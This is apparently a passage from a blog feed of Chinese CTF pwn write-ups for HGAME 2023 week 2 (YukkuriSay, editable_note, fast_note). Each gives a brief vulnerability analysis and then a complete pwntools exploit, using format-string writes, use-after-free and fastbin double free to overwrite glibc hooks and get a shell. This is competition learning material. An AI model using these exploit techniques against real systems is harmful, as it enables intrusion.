operator">+</span> <span class="token number">8</span> <span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;IDA分析程序&quot;&gt;&lt;a href=&quot;#IDA分析程序&quot; class=&quot;headerlink&quot; title=&quot;IDA分析程序&quot;&gt;&lt;/a&gt;IDA分析程序&lt;/h3&gt;&lt;img src=&quot;/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="UAF" scheme="https://starrysky1004.github.io/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-2023-week2-pwn</title>
    <link href="https://starrysky1004.github.io/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/"/>
    <id>https://starrysky1004.github.io/2023/01/27/hgame-2023-week2-pwn/hgame-2023-week2-pwn/</id>
    <published>2023-01-27T01:05:54.000Z</published>
    <updated>2023-02-12T11:24:45.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>1.read不会设置缓冲区最后一个字节为’\0’ ，程序中将读取到的字符串回车改写为0，因此在输出字符串时若其中有残留地址则可泄露地址</p><p>2.gift中存在格式化字符串，但读取内容存在bss段，是非栈上的格式化字符串</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.利用循环中read泄露栈和libc地址</p><p>  （1）调试中下断点得到setbuf和栈到字符串的偏移</p><p>  （2）填充掉偏移部分直到所需泄露的地址，进行地址泄露</p><p>  （3）调试得到泄露到的地址和所需地址之间的偏移，直接在泄露的地址上进行加减</p><p> 2.布栈</p><p>  （1）输出ogg，在stack中找到最接近并且printf之后能运行到的地址，根据修改位数确定栈布局</p><p>3.利用格式化字符串进行任意地址写</p><p>   （1）调试中输入8个a，8个b，8个c，获取栈布局，利用fmt工具获取三个地址偏移</p><p>   （2）计算ogg低字节和低二三字节</p><p>   （3）用hhn写入单字节，hn写入双字节，实现任意地址写</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">32265</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xf8</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'What would you like to let Yukkri say?'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>setbuffer <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">204</span>libc_base <span class="token operator">=</span> setbuffer <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setbuffer'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x118</span> <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>__libc_start_main  <span class="token operator">=</span> stack <span class="token operator">+</span>  <span class="token number">0x8</span>   <span class="token comment">#__libc_start_main + 24</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> p64<span class="token punctuation">(</span>__libc_start_main<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__libc_start_main <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p3<span class="token punctuation">)</span>gadget1 <span class="token operator">=</span> gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span>gadget2 <span class="token operator">=</span> <span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'anything else?(Y/n)'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%8$hhn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">-</span> <span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%9$hn'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'gift for you: \n'</span><span class="token punctuation">,</span>p4<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system</p><p>2.利用UAF漏洞实现任意地址写，把free_hook改成system</p><p>3.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-2.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">30756</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>本题和上题的区别在于创建堆之后不能再修改，因此可以利用double free实现任意地址写</p><p>1.利用unsorted bin泄露libc，计算出ogg</p><p>2.创建两个堆并去释放形成double free</p><p>3.找malloc_hook最近能够绕过大小检查可作为chunk的地址，在该地址上创建堆并将malloc_hook改写为ogg</p><p>4.利用double free会触发mallo_hook的特点解决堆栈不平衡，触发ogg</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/starrysky/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 